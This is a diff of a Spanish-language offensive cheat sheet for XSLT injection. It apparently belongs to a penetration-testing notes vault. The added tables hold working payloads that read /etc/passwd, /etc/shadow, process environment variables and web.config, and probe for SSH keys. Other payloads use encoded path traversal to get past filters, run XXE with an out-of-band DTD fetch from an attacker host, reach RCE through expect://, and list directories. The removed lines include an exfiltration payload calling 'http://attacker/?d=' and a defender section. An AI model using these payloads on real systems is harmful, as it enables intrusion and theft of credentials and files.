@@ -9,114 +9,91 @@ tags:
   - vuln/lfi
   - technique/collection
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 type: CheatSheet
 linked:
-  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
+  - >-
+    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
+    Injection]]
+  - '[[XML External Entity (XXE)]]'
 ---
 # XSLT - Lectura de Archivos (document)
 
 ***
 
-## Cheatsheet
+## Función document()
 
 | **Objetivo** | **Payload** | **Notas** |
-|:---:|:---:|---|
-| **Leer archivo local (Unix)** | `<xsl:copy-of select="document('file:///etc/passwd')"/>` | Parsea como XML — falla si no es XML válido. Ver "Raw read" abajo. |
-| **Leer como text (unparsed-text, XSLT 2.0+)** | `<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>` | Requiere XSLT 2.0/3.0 (Saxon). Lee cualquier texto, no solo XML. |
-| **Leer archivo remoto (HTTP)** | `<xsl:copy-of select="document('http://attacker/evil.xml')"/>` | SSRF via XSLT → fetch remoto + parse. |
-| **Leer Windows** | `<xsl:copy-of select="document('file:///C:/Windows/win.ini')"/>` | Mismo vector en Windows. |
-| **Listar directorio (Saxon)** | `<xsl:for-each select="collection('file:///etc/?select=*')">...</xsl:for-each>` | Saxon 9+ con `collection()`. |
-| **Document con XInclude** | `<xsl:copy-of select="document('../etc/passwd')"/>` | Path traversal relativo al stylesheet loader. |
-| **Chain document() → SSRF interno** | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | Cloud metadata via XSLT → SSRF. |
-| **Document con callback OOB** | `<xsl:copy-of select="document(concat('http://attacker/?d=', $data))"/>` | Exfil datos extraídos via URL query. |
-^xslt-document
+|:---:|:---:|:---:|
+| Lectura XML local Linux | `<xsl:copy-of select="document('file:///etc/tomcat9/server.xml')"/>` | Solo si el archivo es XML válido. |
+| Lectura XML local Windows | `<xsl:copy-of select="document('file:///C:/inetpub/wwwroot/web.config')"/>` | IIS connection strings. |
+| Lectura raw 2.0+ | `<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>` | Saxon — cualquier texto, no solo XML. |
+| Con encoding | `<xsl:value-of select="unparsed-text('file:///etc/shadow', 'UTF-8')"/>` | Force charset. |
+| Por líneas (3.0) | `<xsl:for-each select="unparsed-text-lines('file:///etc/passwd')">...</xsl:for-each>` | Iterar línea a línea. |
+| `/proc/self/environ` | `<xsl:value-of select="unparsed-text('file:///proc/self/environ')"/>` | Env vars del proceso (creds en deploys). |
+| `/proc/self/cmdline` | `<xsl:value-of select="unparsed-text('file:///proc/self/cmdline')"/>` | CLI args (`-Dpassword=...`). |
+| Existencia | `<xsl:value-of select="unparsed-text-available('file:///root/.ssh/id_rsa')"/>` | Boolean oracle sin contenido. |
+| Path traversal | `<xsl:copy-of select="document('../../../../etc/passwd')"/>` | Relativo al stylesheet base. |
+| URL-encoded traversal | `<xsl:copy-of select="document('..%2F..%2Fetc%2Fpasswd')"/>` | Bypass de filtros básicos. |
+| Wrapper externo | `<xsl:copy-of select="document('http://attacker/wrap.xsl')"/>` | Atacante sirve XSL que lee archivos no-XML. |
+^xslt-lfi-document
+
+### Archivos de alto valor
+
+| OS / Stack | Path | Contenido |
+|---|---|---|
+| Linux | `/etc/passwd` | Users + UIDs |
+| Linux | `/proc/self/environ` | Env vars (creds en deploys) |
+| Tomcat | `/etc/tomcat9/tomcat-users.xml` | Hashes admin |
+| Spring | `application.properties` / `application.yml` | DB creds |
+| WordPress | `/var/www/html/wp-config.php` | DB password |
+| Windows | `C:/inetpub/wwwroot/web.config` | Connection strings |
+| .NET | `appsettings.json` | Secrets |
 
 ___
 
-## Overview
+## XXE dentro de XSLT
 
-Función `document()` en XSLT permite cargar un XML externo — **local file o URL remota** — dentro del stylesheet para procesarlo. Si el backend deja al atacante controlar el argumento, = file read arbitrario + SSRF.
+| **Objetivo** | **Payload** | **Notas** |
+|:---:|:---:|:---:|
+| XXE clásico file | `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:template match="/"><out>&xxe;</out></xsl:template>` | Si el parser XML del XSLT no bloquea entidades externas. |
+| XXE Windows | `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` | Probe legible Windows. |
+| XXE param entity OOB | `<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;` | Stage 2 desde DTD remoto. |
+| XXE php filter | `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">` | Lee fuente PHP base64. |
+| XXE expect (RCE PHP) | `<!ENTITY xxe SYSTEM "expect://id">` | RCE si PHP expect:// está habilitado. |
+| Stylesheet con DOCTYPE | `<?xml version="1.0"?><!DOCTYPE stylesheet [...]><xsl:stylesheet ...>` | DOCTYPE va antes de `xsl:stylesheet`. |
+^xslt-lfi-xxe
 
-### Diferencias por versión
+### Stylesheet completo XXE-en-XSLT
 
-| Función | XSLT 1.0 | XSLT 2.0 | XSLT 3.0 |
-|---|---|---|---|
-| `document()` | ✓ Parse XML | ✓ | ✓ |
-| `unparsed-text()` | ✗ | ✓ Plain text | ✓ |
-| `collection()` | ✗ | ✓ Enum dirs | ✓ |
-| `doc()` | ✗ | ✓ | ✓ |
-| `available-environment-variables()` | ✗ | ✗ | ✓ |
-
-### Raw file read — trick
-
-`document()` en XSLT 1.0 falla si el archivo NO es XML válido (ej: `/etc/passwd` no es XML). Bypass:
-
-**Opción A — XSLT 2.0+ `unparsed-text()`:**
 ```xml
-<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
+<?xml version="1.0"?>
+<!DOCTYPE doc [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <output>&xxe;</output>
+  </xsl:template>
+</xsl:stylesheet>
 ```
 
-**Opción B — wrap con CDATA (XSLT 1.0 libxslt trick):**
-```xml
-<xsl:copy-of select="document('file:///etc/passwd')"/>
-<!-- Fallará parseando — pero muchas implementaciones muestran contenido en error. -->
-```
+Ver [[XML External Entity (XXE)]] para variantes de XXE específicas.
 
-**Opción C — base64 encode remoto:**
-```xml
-<xsl:value-of select="document(concat('http://attacker/wrap.xsl?f=', 'target-file'))"/>
-```
-Atacante sirve XSL que lee el archivo en el backend + lo base64-encodea para que sí sea XML válido.
+___
 
-### SSRF chain
+## Lectura de Directorios
 
-`document()` acepta URLs HTTP — convierte XSLT injection en SSRF completo:
-```xml
-<!-- Port scan interno -->
-<xsl:copy-of select="document('http://127.0.0.1:22/')"/>
-<xsl:copy-of select="document('http://127.0.0.1:6379/info')"/>
-
-<!-- Cloud metadata -->
-<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
-
-<!-- Interno LAN -->
-<xsl:copy-of select="document('http://10.0.0.1/admin')"/>
-```
-
-Ver [[Server-Side Request Forgery (SSRF)]] para post-explotación de SSRF.
-
-### Path traversal
-
-`document()` respeta path relativo al stylesheet loader. Si el XSL se carga desde `/var/www/xsl/` → `../` sube dirs:
-```xml
-<xsl:copy-of select="document('../../etc/passwd')"/>
-```
-
-### Limitaciones por motor
-
-| Motor | `document()` | `unparsed-text()` | Notas |
-|---|---|---|---|
-| **libxslt** | ✓ | ✗ (1.0 only) | PHP / Python — path traversal funciona. |
-| **Saxon-HE** | ✓ | ✓ | Java — soporta URI schemes completos (incl. jar://). |
-| **Xalan** | ✓ | ✗ | Java 1.0. |
-| **MSXML** | ✓ (con config) | ✗ | Default restrictivo en versiones modernas. |
-
-### Bloqueo defender
-
-Muchos motores tienen flag `EntityResolver` / `URIResolver` que limita URIs. PHP libxslt:
-```php
-$xsl->setSecurityPrefs(XSL_SECPREF_NONE); // vulnerable
-$xsl->setSecurityPrefs(XSL_SECPREF_DEFAULT); // bloquea file:// + write
-```
-
-Saxon:
-```java
-factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
-```
-
-Si el flag está activo pero `file://` sigue funcionando → misconfig común.
+| **Objetivo** | **Payload** | **Notas** |
+|:---:|:---:|:---:|
+| Listar dir Saxon 9+ | `<xsl:for-each select="collection('file:///etc/?select=*;recurse=no')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Iterador con filtro glob. |
+| Listar recursivo | `<xsl:for-each select="collection('file:///var/www/?select=*;recurse=yes')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Recurse=yes. |
+| Filtro por extensión | `<xsl:for-each select="collection('file:///etc/?select=*.xml')">...</xsl:for-each>` | Glob *.xml / *.conf / *.bak. |
+| Metadata | `<xsl:for-each select="collection('file:///etc/?select=*;metadata=yes')">...</xsl:for-each>` | Tamaño, modificado, etc. |
+| Pasar dir como file | `<xsl:copy-of select="document('file:///etc/')"/>` | Algunos motores devuelven listing al pasar dir. |
+| libxslt dir leak | `<xsl:value-of select="document('file:///proc/self/fd/')"/>` | Open file descriptors del proceso. |
+^xslt-lfi-dirs
 
 ***
